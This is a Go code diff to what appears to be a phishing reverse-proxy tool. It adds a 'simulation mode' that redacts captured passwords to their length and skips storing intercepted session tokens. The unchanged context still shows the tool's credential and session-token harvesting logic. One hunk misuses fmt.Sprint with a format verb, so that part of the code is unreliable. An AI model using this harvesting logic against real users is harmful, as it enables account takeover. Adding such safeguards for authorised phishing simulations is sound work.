@@ -68,6 +68,7 @@ type HttpProxy struct {
 	cookieName        string
 	last_sid          int
 	developer         bool
+	simulation_mode   bool
 	ip_whitelist      map[string]int64
 	ip_sids           map[string]string
 	auto_filter_mimes []string
@@ -81,7 +82,7 @@ type ProxySession struct {
 	Index       int
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, simulation_mode bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -92,6 +93,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
+		simulation_mode:   simulation_mode,
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
@@ -449,9 +451,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if pl.password.tp == "json" {
 								pm := pl.password.search.FindStringSubmatch(string(body))
 								if pm != nil && len(pm) > 1 {
-									p.setSessionPassword(ps.SessionId, pm[1])
-									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+									var password string
+									if simulation_mode {
+										password = fmt.Sprint("redacted; length: %d", len(pm[1]))
+									} else {
+										password = pm[1]
+									}
+									p.setSessionPassword(ps.SessionId, password)
+									log.Success("[%d] Password: [%s]", ps.Index, password)
+									if err := p.db.SetSessionPassword(ps.SessionId, password); err != nil {
 										log.Error("database: %v", err)
 									}
 								}
@@ -496,9 +504,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
 										pm := pl.password.search.FindStringSubmatch(v[0])
 										if pm != nil && len(pm) > 1 {
-											p.setSessionPassword(ps.SessionId, pm[1])
-											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+											var password string
+											if simulation_mode {
+												password = fmt.Sprintf("redacted; length: %d", len(pm[1]))
+											} else {
+												password = pm[1]
+											}
+											p.setSessionPassword(ps.SessionId, password)
+											log.Success("[%d] Password: [%s]", ps.Index, password)
+											if err := p.db.SetSessionPassword(ps.SessionId, password); err != nil {
 												log.Error("database: %v", err)
 											}
 										}
@@ -677,9 +691,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									is_auth = false
 								}
 								if is_auth {
-									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens); err != nil {
-										log.Error("database: %v", err)
+									if !simulation_mode {
+										if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens); err != nil {
+											log.Error("database: %v", err)
+										}
 									}
+
 									s.IsDone = true
 								}
 							}
@@ -818,12 +835,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if ok && s.IsDone {
 					for _, au := range pl.authUrls {
 						if au.MatchString(resp.Request.URL.Path) {
-							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens)
-							if err != nil {
-								log.Error("database: %v", err)
-							}
-							if err == nil {
-								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+							if !simulation_mode {
+								err := p.db.SetSessionTokens(ps.SessionId, s.Tokens)
+								if err != nil {
+									log.Error("database: %v", err)
+								}
+								if err == nil {
+									log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+								}
 							}
 							break
 						}
